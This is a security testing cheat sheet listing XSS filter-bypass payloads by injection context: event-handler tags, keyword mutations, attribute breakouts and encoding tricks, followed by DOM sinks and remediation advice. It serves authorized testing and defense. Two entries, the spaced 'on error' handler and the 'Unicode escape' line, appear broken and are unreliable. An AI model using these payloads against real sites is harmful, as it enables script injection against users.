# XSS Filter Bypass (Authorized Testing Only)

> For use only within authorized scope. Non-destructive PoCs (e.g. `alert(document.domain)` / `console.log`) — never weaponize.

## Reason about context first
XSS bypass depends on **where** your input lands:

| Context | Breakout concern |
|---------|------------------|
| HTML body | need `<` `>` to inject a tag |
| HTML attribute | break out of quotes, or use event handlers |
| JS string | break out of quotes/backticks, close statement |
| URL / `href` | `javascript:` scheme |
| JSON reflected into JS | escaping of `"` `</script>` |

## When `<script>` is blocked — alternative vectors
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<input autofocus onfocus=alert(document.domain)>
<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">
```

## When keywords are filtered — mutation
```html
<!-- case -->
<ScRiPt>alert(1)</ScRiPt>
<!-- nested / doubled (naive strip-once filters) -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<!-- split event handler with whitespace/comments -->
<img src=x on error=alert(1)>
<a href="jav&#x09;ascript:alert(1)">x</a>
```

## Attribute-context breakout
```html
" onmouseover="alert(document.domain)
"><svg onload=alert(document.domain)>
' autofocus onfocus='alert(document.domain)
```

## Encoding tricks (context dependent)
```
HTML entity:    &lt;img src=x onerror=alert(1)&gt;    (when later HTML-decoded)
Unicode escape (JS ctx):  alert(1)
URL double-encode:  %253Cscript%253E
Backtick template (JS ctx):  `${alert(1)}`
```

## DOM XSS sinks to hunt
`innerHTML`, `document.write`, `eval`, `setTimeout(str)`, `location`, `jQuery.html()`, `insertAdjacentHTML`. Trace from source (`location.hash`, `postMessage`, `document.referrer`) to sink.

## Remediation (what actually stops it)
- **Context-aware output encoding** (HTML, attribute, JS, URL) — not blocklists.
- **CSP** (`script-src 'self'` without `unsafe-inline`) as defense-in-depth.
- Framework auto-escaping; avoid `dangerouslySetInnerHTML` / `v-html` with user data.
- Sanitize rich HTML with a vetted library (DOMPurify) server- and client-side.
